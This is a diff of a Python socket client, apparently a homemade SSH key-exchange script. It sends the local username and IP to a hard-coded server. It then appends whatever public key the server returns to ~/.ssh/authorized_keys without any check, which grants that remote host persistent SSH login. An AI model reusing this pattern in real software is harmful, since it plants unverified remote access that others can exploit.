@@ -1,16 +1,19 @@
 import socket
 import subprocess
+import os
 
-IP = '192.168.1.139'
+IP = '192.168.83.45'
 PORT = 9090
 ADDR = (IP, PORT)
 SIZE = 1024
 FORMAT = "utf-8"
 DISCONNECT_MSG = "!DISCONNECT"
 
-def send_ssh_key():
-	subprocess.run(["ssh-keygen", "-t", "rsa", "-f", "id_rsa"], capture_output=True)
-	subprocess.run(["ssh-copy-id", "-i", "id_rsa.pub", f"{IP}"])
+def save_key(public_key):
+	authorized_keys_path = os.path.expanduser("~/.ssh/authorized_keys")
+	with open(authorized_keys_path, "a") as file:
+		file.write(public_key + "\n")
+		print("Public key added.")
 
 def get_ip():
 	cmd = "ifconfig | grep -oE '([0-9]+\.){3}[0-9]+' | head -n 1"
@@ -18,8 +21,6 @@ def get_ip():
 	return cmd_output
 
 def main():
-	
-	send_ssh_key()
 
 	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	client.connect(ADDR)
@@ -29,9 +30,18 @@ def main():
 
 	username = subprocess.check_output("whoami").decode().strip()
 	client_ip = get_ip()
-	ssh_public_key = open("id_rsa.pub").read()
-	client_info = f"{username},{client_ip},{ssh_public_key}"
+	client_info = f"{username},{client_ip}"
 	client.send(client_info.encode(FORMAT))
+
+	print("Done sending")
+
+
+	data = client.recv(SIZE).decode(FORMAT)
+
+	servername, server_key = data.split(",")
+	save_key(server_key)
+
+	print("Done receiving")
 
 	connected = True
 	while connected:
